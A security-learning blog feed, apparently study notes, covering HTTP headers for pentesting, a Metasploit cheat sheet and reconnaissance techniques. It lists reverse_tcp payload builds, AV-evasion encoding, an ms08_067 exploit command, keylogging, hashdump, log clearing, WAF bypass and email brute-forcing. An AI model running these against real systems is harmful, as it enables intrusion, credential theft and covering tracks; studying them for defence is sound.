title="2、用自己的语言描述get、post、Accept、Referer、User-Agent、host、cookie、X_Forwarded_for、Location各请求头的含义"></a>2、用自己的语言描述get、post、Accept、Referer、User-Agent、host、cookie、X_Forwarded_for、Location各请求头的含义</h2><p><strong>Connection</strong>表示持久的客户端与服务连接。（close关闭）</p><p>get：访问的地址，里面有=什么什么的是参数一般可以插入payllody，可以插入攻击代码如果没有一般没漏洞，HTTP版本1.1必须使用host请求头get发送的数据在url公开</p><p>post:一般为表单提交；通过post提交的数据在url不可见；</p><p>accept:表示浏览器支持的MIME类型，优先顺序是从左到右表示我当前的浏览器希望接受什么类型的文件，这是请求首部，当服务器没有客户端想要的资源的媒体类型时，会返回406 Not Acceptable 响应。当然使用了 <em>/</em> 表示愿意接受任意类型的资源，所以应不会看到这个响应。另外，这里的 q 表示权重，权重在 0-1 之间，（顺序为重大到小优先顺序）可以理解成客户端在这些给出的类型中，想优先接受什么类型，可以服务器就可以根据客户端的需要返回相应的资源。</p><p>如果没有，则默认为 1 。这里前面几个类型都没有标明，则默认都是 1 ，表示优先这些类型，后面的 0.9 表示前面都没有就用这个，最后的 0.8 表示如果都没有，那么任意的类型都行）</p><p>Referer：向服务器提交跳转链接所在地址，如果用户时通过链接跳转到当前页面，此请求域为链接所在界面的URL。</p><p>当访问某个网站是通过什么访问的，有时候一定要从某个地方访问挑战，我们便可以改为从设定的地方访问</p><p>Use-Agent:用来收集数据例如什么电脑，什么浏览器,MAC地址等等用来取证</p><p>Host:向服务器提交（服务器）主机和端口号</p><p>Cookie:第一次访问可能不带，第二次调用本地记录向客户端发送来验证身份</p><p>X_Forwarded_for：伪造ip登录，也可以伪造多IP登录例如127.0.$设置个字典$.$设置个字典$用于过waf绕后台抓包时添加</p><p><img src="//upload-images.jianshu.io/upload_images/21549033-03f08085be99b2ab.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/793/format/webp" alt="img"></p><p>Location: 这个消息头用于在重定向响应(那些状态码以3开头的响应)中说明重定向的目标。跳转</p><h2 id="3、常用-http-支持的方法有那些，同时对Head、options、put、get、post用自己的语言进行描述"><a href="#3、常用-http-支持的方法有那些，同时对Head、options、put、get、post用自己的语言进行描述" class="headerlink" title="3、常用 http 支持的方法有那些，同时对Head、options、put、get、post用自己的语言进行描述"></a>3、常用 http 支持的方法有那些，同时对Head、options、put、get、post用自己的语言进行描述</h2><p>HTTP请求的常用方法有：GET方法、POST方法、HEAD方法、PUT方法、DELETE方法、CONNECT方法、OPTIONS方法、TRACE方法。</p><p>Head:与get相似，检查资源是否存在。waf一般不拦截</p><p>Options:查看当前网站支持的请求方法。用来检测服务器性能</p><p>Put：把文件上传到服务器（后一个会覆盖上一个0，一般用来改资源）</p><p>get：从服务器获得数据返回前进不影响</p><p>post:向服务器传送数据后一个资源不会覆盖上一个返回前会一直向服务器发送请求（一般用增加资源）</p><p>TRACE.这种方法主要用于诊断。服务器应在响应主体中返回其收到的请求消息的具体内容。这种方法可用于检测客户端与服务器之间是否存在任何操纵请求的代理服务器。</p><h2 id="4、cookie头里面的secure与HttpOnly项分别代表什么含义"><a href="#4、cookie头里面的secure与HttpOnly项分别代表什么含义" class="headerlink" title="4、cookie头里面的secure与HttpOnly项分别代表什么含义"></a>4、cookie头里面的secure与HttpOnly项分别代表什么含义</h2><p>Secure：如果设置这个属性.则仅在HTTPS请求中提交cookie.</p><p>HttpOnly：如果设置这个属性，将无法通过客户端JavaScript直接访问cookie.</p><h2 id="5、状态码"><a href="#5、状态码" class="headerlink" title="5、状态码"></a>5、状态码</h2><p>每条HTTP响应消息都必须在第一行中包含一个状态码，说明请求的结果。根据代码的第一</p><p>位数字，可将状态码分为以下5类。</p><p>1xx</p><p>-提供信息。</p><p>2xx—请求被成功提交。</p><p>3xx—客户端被重定向到其他资源。</p><p>4xx-请求包含某种错误。</p><p>5xx—服务器执行请求时遇到错误。</p><p>还有大量特殊状态码，其中许多状态码仅用在特殊情况下。下面列出渗透测试员在攻击Web</p><p>应用程序时最有可能遇到的状态码及其相关的原因短语。</p><p>100Continue。当客户端提交一个包含主体的请求时.将发送这个响应。该响应表示已收到请求消息头.客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。</p><p>200Ok。本状态码表示已成功提交请求，且响应主体中包含请求结果。</p><p>201Created. PUT请求的响应返回这个状态码，表示请求已成功提交。</p><p>301Moved Permanently。本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。</p><p>302Found。本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL.</p><p>304Not Modified。本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与工f-None-Match消息头确定客户端是否拥有最新版本的资源。</p><p>400Bad Request。本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效的方式修改请求时(例如在URL中插人一个空格符)，可能会遇到这个状态码。</p><p>401Unauthorized.服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。</p><p>403Forbidden。本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。</p><p>404Not Found。本状态码表示所请求的资源并不存在。</p><p>]405Method Not Allowed。本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。</p><p>413Request Entity Too Large。如果在本地代码中探查缓冲器滋出瀚洞并就此提交超长数据串.则本状态码表示请求主体过长，服务器无法处理。</p><p>414Request URI Too Long。与前一个响应类似，本状态码表示请求中的URL过长，服务器无法处理。</p><p>500Internal Server Error。本状态码表示服务器在执行请求时遇到错误。当提交无法预料的输人、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。</p><p>503Service Unavailable。通常，本状态码表示尽管Web服务器运转正常.并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit</title>
      <link href="2020/09/12/Metasploit/"/>
      <url>2020/09/12/Metasploit/</url>
      
        <content type="html"><![CDATA[<h2 id="msf的使用"><a href="#msf的使用" class="headerlink" title="msf的使用"></a>msf的使用</h2><p>Msfconsole:是一个一体化集中控制台，允许你访问到几乎所有的MSF框架选项**</p><hr><p>metasploit就是一个免费的漏洞框架，利用他人人都是黑客，使用者不需要任何编程基础就可以使用</p><h3 id="check：检测漏洞是否存在"><a href="#check：检测漏洞是否存在" class="headerlink" title="check：检测漏洞是否存在"></a>check：检测漏洞是否存在</h3><h3 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令:"></a>msf常用命令:</h3><p>show exploits</p><p>列出metasploit框架中的所有渗透攻击模块。</p><p>show payloads</p><p>列出metasploit框架中的所有攻击载荷。</p><p>show auxiliary</p><p>列出metasploit框架中的所有辅助攻击载荷。</p><p>search name</p><p>查找metasploit框架中所有的渗透攻击和其他模块。</p><p>info</p><p>展示出制定渗透攻击或模块的相关信息。</p><p>use name</p><p>装载一个渗透攻击或模块。</p><p>LHOST</p><p>你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。</p><p>RHOST</p><p>远程主机或是目标主机。</p><p>set function</p><p>设置特定的配置参数（EG：设置本地或远程主机参数）。</p><p>setg function</p><p>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。</p><p>show options</p><p>列出某个渗透攻击或模块中所有的配置参数。</p><p>show targets</p><p>列出渗透攻击所有支持的目标平台。</p><p>set target num</p><p>指定你所知道的目标的操作系统以及补丁版本类型。</p><p>set payload name</p><p>指定想要使用的攻击载荷。</p><p>show advanced</p><p>列出所有高级配置选项。</p><p>set autorunscript migrate -f.</p><p>在渗透攻击完成后，将自动迁移到另一个进程。</p><p>check</p><p>检测目标是否选定渗透攻击存在相应的安全漏洞。</p><p>exploit</p><p>执行渗透攻击或模块来攻击目标。</p><p>exploit -j</p><p>在计划任务下进行渗透攻击（攻击将在后台进行）。</p><p>exploit -z</p><p>渗透攻击完成后不与回话进行交互。</p><p>exploit -e encoder</p><p>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。</p><p>exploit -h</p><p>列出exploit命令的帮助信息。</p><p>sessions -l</p><p>列出可用的交互会话（在处理多个shell时使用）。</p><p>sessions -l -v</p><p>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</p><p>sessions -s script</p><p>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。</p><p>sessions -K</p><p>杀死所有活跃的交互会话。</p><p>sessions -c cmd</p><p>在所有活跃的metasploit会话上执行一个命令。</p><p>sessions -u sessionID</p><p>升级一个普通的win32 shell到metasploit shell。</p><p>db_create name</p><p>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。</p><p>db_connect name</p><p>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。</p><p>db_namp</p><p>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。</p><p>db_autopwn -h</p><p>展示出db_autopwn命令的帮助信息。</p><p>db_autopwn -p -r -e</p><p>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。</p><p>db_destroy</p><p>删除当前数据库。</p><p>db_destroy user：passwd@host：port/database</p><p>使用高级选项来删除数据库。</p><p><strong><em>metasploit命令</em></strong></p><p>help</p><p>打开meterpreter使用帮助。</p><p>run scriptname</p><p>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</p><p>sysinfo</p><p>列出受控主机的系统信息。</p><p>ls</p><p>列出目标主机的文件和文件夹信息。</p><p>use priv</p><p>加载特权提升扩展模块，来扩展metasploit库。</p><p>ps</p><p>显示所有运行的进程以及相关联的用户账户。</p><p>migrate PID</p><p>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。</p><p>use incognito</p><p>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）</p><p>list_tokens -u</p><p>列出目标主机用户的可用令牌。</p><p>list_tokens -g</p><p>列出目标主机用户组的可用令牌。</p><p>impersonate_token DOMAIN_NAME\USERNAME</p><p>假冒目标主机上的可用令牌。</p><p>steal_token PID</p><p>盗窃给定进程的可用令牌并进行令牌假冒。</p><p>drop_token</p><p>停止假冒当前令牌。</p><p>getsystem</p><p>通过各种攻击向量来提升系统用户权限。</p><p>execute -f cmd.exe -i</p><p>执行cmd.exe命令并进行交互。</p><p>execute -f cmd.exe -i -t</p><p>以所有可用令牌来执行cmd命令并隐藏该进程。</p><p>rev2self</p><p>回到控制目标主机的初始用户账户下。</p><p>reg command</p><p>在目标主机注册表中进行交互，创建，删除，查询等操作。</p><p>setdesktop number</p><p>切换到另一个用户界面（该功能基于那些用户已登录）。</p><p>screenshot</p><p>对目标主机的屏幕进行截图。</p><p>upload file</p><p>向目标主机上传文件。</p><p>download file</p><p>从目标主机下载文件。</p><p>keyscan_start</p><p>针对远程目标主机开启键盘记录功能。</p><p>keyscan_dump</p><p>存储目标主机上捕获的键盘记录。</p><p>keyscan_stop</p><p>停止针对目标主机的键盘记录。</p><p>getprivs</p><p>尽可能多的获取目标主机上的特权。</p><p>uictl enable keyboard/mouse</p><p>接管目标主机的键盘和鼠标。</p><p>background</p><p>将你当前的metasploit shell转为后台执行。</p><p>hashdump</p><p>导出目标主机中的口令哈希值。</p><p>use sniffer</p><p>加载嗅探模式。</p><p>sniffer_interfaces</p><p>列出目标主机所有开放的网络端口。</p><p>sniffer_dump interfaceID pcapname</p><p>在目标主机上启动嗅探。</p><p>sniffer_start interfaceID packet-buffer</p><p>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</p><p>sniffer_stats interfaceID</p><p>获取正在实施嗅探网络接口的统计数据。</p><p>sniffer_stop interfaceID</p><p>停止嗅探。</p><p>add_user username password -h ip</p><p>在远程目标主机上添加一个用户。</p><p>clearev</p><p>清楚目标主机上的日志记录。</p><p>timestomp</p><p>修改文件属性，例如修改文件的创建时间（反取证调查）。</p><p>reboot</p><p>重启目标主机。</p><p><strong><em>MSFpayload命令</em></strong></p><p>msfpayload -h</p><p>msfpayload的帮助信息。</p><p>msfpayload windows/meterpreter/bind_tcp O</p><p>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。</p><p>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe</p><p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。</p><p>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw</p><p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。</p><p>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c</p><p>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。</p><p>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java</p><p>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。</p><p><strong><em>msfencode命令</em></strong></p><p>mefencode -h</p><p>列出msfencode的帮助命令。</p><p>msfencode -l</p><p>列出所有可用的编码器。</p><p>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)</p><p>显示编码缓冲区的格式。</p><p>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe</p><p>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。</p><p>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</p><p>创建一个经过多种编码格式嵌套编码的攻击载荷。</p><p>msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c</p><p>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。</p><p><strong><em>MSFcli命令</em></strong></p><p>msfcli | grep exploit</p><p>仅列出渗透攻击模块。</p><p>msfcli | grep exploit/windows</p><p>仅列出与windows相关的渗透攻击模块。</p><p>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E</p><p>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听</p><h2 id="如何更新MSF"><a href="#如何更新MSF" class="headerlink" title="如何更新MSF"></a>如何更新MSF</h2><h3 id="1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：http-www-kali-org-downloads"><a href="#1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：http-www-kali-org-downloads" class="headerlink" title="1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：http://www.kali.org/downloads/"></a>1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：<a href="http://www.kali.org/downloads/">http://www.kali.org/downloads/</a></h3><p>kail下载地址：</p><p>[<strong><a href="https://pan.baidu.com/s/1c05BnlI">https://pan.baidu.com/s/1c05BnlI</a></strong></p><p><a href="http://cdimage.kali.org/kali-weekly/">http://cdimage.kali.org/kali-weekly/</a></p><p><a href="http://sourceforge.net/projects/Metasploitable/files/Metasploitable2/">http://sourceforge.net/projects/Metasploitable/files/Metasploitable2/</a></p><p>注意: 测试系统下载下来后是zip格式的。解压后使用VM打开。如果是VMware的，直接打开用VMware打开Metasploitable.vmx文件即可。Metasploitable系统的默认账号和密码是msfadmin:msfadmin如果你想了解更多关于Metasploitable的信息，你可以去下面这个网站：<a href="https://community.rapid7.com/docs/DOC-1875">https://community.rapid7.com/docs/DOC-1875</a></p><h3 id="2🐱‍🚀、加入更新源"><a href="#2🐱‍🚀、加入更新源" class="headerlink" title="2🐱‍🚀、加入更新源"></a>2🐱‍🚀、加入更新源</h3><p>一、替换yum源，把kail原有更新源#号注释掉</p><p><img src="//upload-images.jianshu.io/upload_images/21549033-1ab4263a437bd7db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>root@kali:~#vi /etc/apt/sources.list（这是修改更新源）</p><p>（更新源全国各地都不一样，因为当地的电信，移动防火墙会拦截）</p><p>kali-rolling版本：（中科大的就够用了，个人按需吧）</p><p># kali官方源</p><p>deb <a href="http://http.kali.org/">http://http.kali.org/</a> kali-rolling main non-free contrib</p><p>deb-src <a href="http://http.kali.org/">http://http.kali.org/</a> kali-rolling main non-free contrib</p><p>#中科大源</p><p>deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p><p>deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p><p><img src="//upload-images.jianshu.io/upload_images/21549033-56458e7248e32cb3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1069/format/webp" alt="img"></p><p>shift+：wq保存退出</p><h3 id="添加数字签名"><a href="#添加数字签名" class="headerlink" title="添加数字签名"></a>添加数字签名</h3><p>wget archive.kali.org/archive-key.asc   //下载签名</p><p>apt-key add archive-key.asc   //安装签名</p><p>注：如果添加数字签名还提示无法安装可删除原有msf</p><p>root@kali:~# apt remove metasploit-framework</p><p><strong>注：</strong>卸载过程中无法获得锁/var/cache/apt/archives/lock - open (11:资源暂时不可用)</p><p>无法对目录/var/cache/apt/archives/加锁</p><p>root@kali:~# sudo rm /var/cache/apt/archives/lock  //进行强制解锁</p><p>root@kali:~# sudo rm /var/cache/apt/archives/ </p><hr><h2 id="安装msf框架"><a href="#安装msf框架" class="headerlink" title="安装msf框架"></a><strong>安装msf框架</strong></h2><p><strong>oot@bogon:~# apt-get update</strong></p><p>root@kali:~# apt-get  install metasploit-framework//安装msf框架</p><p><img src="//upload-images.jianshu.io/upload_images/21549033-cf4550c3ebbdb454.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/811/format/webp" alt="img"></p><p>选择yes说明更新成功</p><p>root@kali:~#msfconsole   //发现有提示数据库未启动，退出msf启动数据库</p><p>root@kali:~# systemctl start postgresql  //启动数据库</p><p>root@kali:~# systemctl enable postgresql //允许开机自启动</p><p>root@kali:~# msfdb init //构建数据库缓存</p><p>root@kali:~#msfconsole</p><hr><p>注意：如果更新完msf出现才下问题</p><p>root@kaliew:~# msfconsole</p><p>[*] Bundler failed to load and returned this error:</p><p>   ‘cannot load such file – bundler/setup’</p><p>[*] You may need to uninstall or upgrade bundler</p><p>解决方法：</p><p>root@kaliew:~# sudo gem install bundler</p><p>root@kaliew:~# bundle update celluloid</p><h2 id="MSF之meterpreter后期攻击使用方法"><a href="#MSF之meterpreter后期攻击使用方法" class="headerlink" title="MSF之meterpreter后期攻击使用方法"></a>MSF之meterpreter后期攻击使用方法</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="2020/09/12/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2020/09/12/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h1><h2 id="1-1-第一步-域名探测"><a href="#1-1-第一步-域名探测" class="headerlink" title="1.1 第一步 域名探测"></a>1.1 <strong>第一步 域名探测</strong></h2><p>​    当我们要对一个站点进行渗透测试之前，一般渗透测试人员常见方法是直接通漏洞扫描器来对指定目标站点进行渗透，当指定的目标站点无漏洞情况，渗透测试员就需要进行信息收集工作来完成后期的渗透。</p><p>​    目前一般域名漏洞扫描工具有AWVS、APPSCAN、Netspark、WebInspect、Nmap、Nessus、天镜、明鉴、WVSS、RSAS等，后面会分开给大家讲解。</p><h2 id="1-2-第二步-子域名探测"><a href="#1-2-第二步-子域名探测" class="headerlink" title="1.2 第二步 子域名探测"></a>1.2 <strong>第二步 子域名探测</strong></h2><p>根据主域名，可以获取二级域名、三级域名、……主要姿势可以有：</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps1.jpg" alt="img"> </p><p><strong>【1】DNS域传送漏洞（不得不称赞）</strong></p><p>​       如果存在，不仅能搜集子域名，还能轻松找到一枚洞，这样子的好事百试不厌。如果SRC一级域名不多，直接在kali下 dnsenum oldboyedu.com 。</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps2.jpg" alt="img"> </p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps3.jpg" alt="img"> </p><p><strong>工具说明及用法可参考如下：</strong></p><p>​    dnsenum的目的是尽可能收集一个域的信息，它能够通过谷歌或者字典文件猜测可能存在的域名，以及对一个网段进行反向查询。它可以查询网站的主机地址信息、域名服务器、mx record（函件交换记录），在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。</p><p><strong>参数说明：</strong></p><p> -h        查看工具使用帮助</p><p>–dnsserver    <server>    指定域名服务器</p><p>–enum    快捷选项，相当于”–threads 5 -s 15 -w” </p><p>–noreverse    跳过反向查询操作</p><p>–nocolor    无彩色输出</p><p>–private    显示并在”domain_ips.txt”文件结尾保存私有的ips</p><p>–subfile <file>    写入所有有效的子域名到指定文件</p><p>-t, –timeout <value>     tcp或者udp的连接超时时间，默认为10s（时间单位：秒）</p><p>–threads <value>    查询线程数</p><p>-v, –verbose    显示所有的进度和错误消息</p><p>-o ,–output <file>    输出选项，将输出信息保存到指定文件</p><p>-e, –exclude    <regexp>    反向查询选项，从反向查询结果中排除与正则表达式相符的PTR记录，在排查无效主机上非常有用</p><p>-w, –whois    在一个C段网络地址范围提供whois查询</p><p>-f dns.txt 指定字典文件，可以换成 dns-big.txt 也可以自定义字典</p><p><strong>相关解析记录说明可参考：</strong><a href="https://wenku.baidu.com/view/d2d597b669dc5022aaea0030.html">https://wenku.baidu.com/view/d2d597b669dc5022aaea0030.html</a></p><p><strong>【2】备案号查询</strong></p><p>​       这算是奇招吧，通过查询系统域名备案号，再反查备案号相关的域名，收获颇丰。</p><p><strong>网站备案查询地址：<a href="http://www.beianbeian.com/">http://www.beianbeian.com</a></strong></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps4.jpg" alt="img"> </p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps5.jpg" alt="img"> </p><p><strong>【3】SSL证书</strong></p><p>​       通过查询SSL证书，获取的域名存活率很高，这应该也是不错的思路。</p><p>查询网址: <a href="https://myssl.com/ssl.html">https://myssl.com/ssl.html</a>  和<a href="https://www.chinassl.net/ssltools/ssl-checker.html">https://www.chinassl.net/ssltools/ssl-checker.html</a></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps6.jpg" alt="img"> </p><p><strong>【4】google搜索C段</strong></p><p>​       这招用的比较少，国内没条件的就用bing或百度吧（国内站点足矣），在没什么进展的时候或许会有意外惊喜。</p><p>方法一：参考GoogleHack用法</p><p>方法二：用k8工具，前提条件记得注册bing接口</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps7.jpg" alt="img"> </p><p><strong>什么是C段：</strong>比如在：127.127.127.4 这个IP上面有一个网站 127.4 这个服务器上面有网站我们可以想想..他是一个非常大的站几乎没什么漏洞！但是在他同C段 127.127.127.1<del>127.127.127.255 这 1</del>255 上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透 1~255任何一个站 之后提权来嗅探得到127.4 这台服务器的密码 甚至3389连接的密码后台登录的密码 如果运气好会得到很多的密码…</p><p><strong>【5】APP提取</strong></p><p>​       反编译APP进行提取相关IP地址，此外在APP上挖洞的时候，可以发现前面招式找不到的域名，在APP里面有大量的接口IP和内网 IP，同时可获取不少安全漏洞。</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps8.jpg" alt="img"> </p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps9.jpg" alt="img"> </p><p><strong>【6】微信公众号</strong></p><p>​       企业的另一通道，渗透相关公众号，绝对会有意外收获：不少漏洞+域名，有关Burp如何抓取微信公众号数据可参考 Burp APP抓包。</p><p><strong>【7】字典枚举法</strong></p><p>​       字典枚举法是一种传统查找子域名的技术，这类工具有  DNSReconcile、Layer子域名挖掘机、DirBuster等。</p><p><strong>【8】公开DNS源</strong></p><p>Rapid7下Sonar项目发布的： <a href="https://scans.io/study/sonar.fdns_v2%E3%80%82">https://scans.io/study/sonar.fdns_v2。</a></p><p>DNS历史解析：     <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p><p><strong>【9】威胁情报查询</strong></p><p>华为安全情报 <a href="https://isecurity.huawei.com/">https://isecurity.huawei.com</a></p><h2 id="1-3-第三步-敏感信息收集"><a href="#1-3-第三步-敏感信息收集" class="headerlink" title="1.3 第三步 敏感信息收集"></a>1.3 <strong>第三步 敏感信息收集</strong></h2><p><strong>【1】Web源代码泄露</strong></p><p>​      通过工具暴破相关Web源代码泄露，流程如下：</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps10.jpg" alt="img"> </p><p>​    最想强调的是github信息泄露了，直接去github上搜索，收获往往是大于付出。可能有人不自信认为没能力去SRC挖洞，可是肯定不敢说不会上网不会搜索。github相关的故事太多，但是给人引出的信息泄露远远不仅在这里：github.com、rubygems.org、pan.baidu.com…</p><p>QQ群备注或介绍等，甚至混入企业qq工作群…</p><p>​    然后说再多，也没这个好用：<a href="https://sec.xiaomi.com/article/37">https://sec.xiaomi.com/article/37</a>   全自动监控github</p><p><strong>信息泄露收集可能会用到如下地址：</strong></p><p>网盘搜索：<a href="http://www.pansou.com/%E6%88%96">http://www.pansou.com/或</a><a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a> 网盘密码破解可参考：<a href="https://www.52pojie.cn/thread-763130-1-1.html">https://www.52pojie.cn/thread-763130-1-1.html</a></p><p>社工信息泄露：<a href="https://www.instantcheckmate.com/%E3%80%81http://www.uneihan.com/">https://www.instantcheckmate.com/、http://www.uneihan.com/</a></p><p>源码搜索：<a href="https://searchcode.com/%E3%80%81">https://searchcode.com/、</a><a href="https://gitee.com/">https://gitee.com/</a>、gitcafe.com、code.csdn.net</p><p>钟馗之眼： <a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p>天眼查   <a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>其它：威胁情报：微步在线、 ti.360.cn、 Virustotal</p><p><strong>【2】邮箱信息收集</strong></p><p>​    收集邮箱信息主要有两个作用：1.通过发现目标系统账号的命名规律，可以用来后期登入其他子系统。2.爆破登入邮箱用。</p><p>​    通常邮箱的账号有如下几种生成规律： 比如某公司有员工名叫做“张小三”，它的邮箱可能如下：</p><p><a href="mailto:&#x7a;&#x68;&#97;&#x6e;&#x67;&#120;&#105;&#97;&#x6f;&#x73;&#x61;&#x6e;&#x40;&#120;&#x78;&#x78;&#46;&#x63;&#111;&#109;">&#x7a;&#x68;&#97;&#x6e;&#x67;&#120;&#105;&#97;&#x6f;&#x73;&#x61;&#x6e;&#x40;&#120;&#x78;&#x78;&#46;&#x63;&#111;&#109;</a>     <a href="mailto:&#120;&#x69;&#97;&#111;&#115;&#97;&#110;&#46;&#122;&#x68;&#x61;&#110;&#103;&#x40;&#x78;&#x78;&#x78;&#46;&#99;&#x6f;&#x6d;">&#120;&#x69;&#97;&#111;&#115;&#97;&#110;&#46;&#122;&#x68;&#x61;&#110;&#103;&#x40;&#x78;&#x78;&#x78;&#46;&#99;&#x6f;&#x6d;</a>        <a href="mailto:&#x7a;&#120;&#105;&#x61;&#x6f;&#x73;&#x61;&#x6e;&#x40;&#120;&#x78;&#x78;&#46;&#x63;&#111;&#x6d;">&#x7a;&#120;&#105;&#x61;&#x6f;&#x73;&#x61;&#x6e;&#x40;&#120;&#x78;&#x78;&#46;&#x63;&#111;&#x6d;</a></p><p>​    当我们收集几个邮箱之后，便会大致猜出对方邮箱的命名规律。除了员工的邮箱之外，通过公司会有一些共有的邮箱，比如人力的邮箱、客服的邮箱，<a href="mailto:&#x68;&#x72;&#x40;&#x78;&#x78;&#120;&#x2e;&#99;&#111;&#109;">&#x68;&#x72;&#x40;&#x78;&#x78;&#120;&#x2e;&#99;&#111;&#109;</a>/kefu@xxx.com,这种邮箱有时会存在弱口令，在渗透时可额外留意一下。我们可以通过手工或者工具的方式来确定搜集邮箱：</p><p><strong>手工的方式：</strong></p><p>1.可以到百度等搜索引擎上搜索邮箱信息</p><p>2.github等第三方托管平台</p><p>3.社工库</p><p><strong>工具方式：</strong></p><p>​    在邮箱收集领域不得不提一个经典的工具，The Harvester,The Harvester可用于搜索Google、Bing和PGP服务器的电子邮件、主机以及子域名,因此需要翻墙运行该工具。工具下载地址为：<a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><p>· <strong>注：**</strong>python -m pip install -r requirements.txt**  <strong>导入相关配置，python3.6版本</strong></p><p>使用方式很简单：</p><p>   ./theHarvester.py -d 域名   -1 1000   -b all</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps11.jpg" alt="img"> </p><p><strong>【3】历史漏洞收集</strong></p><p>​    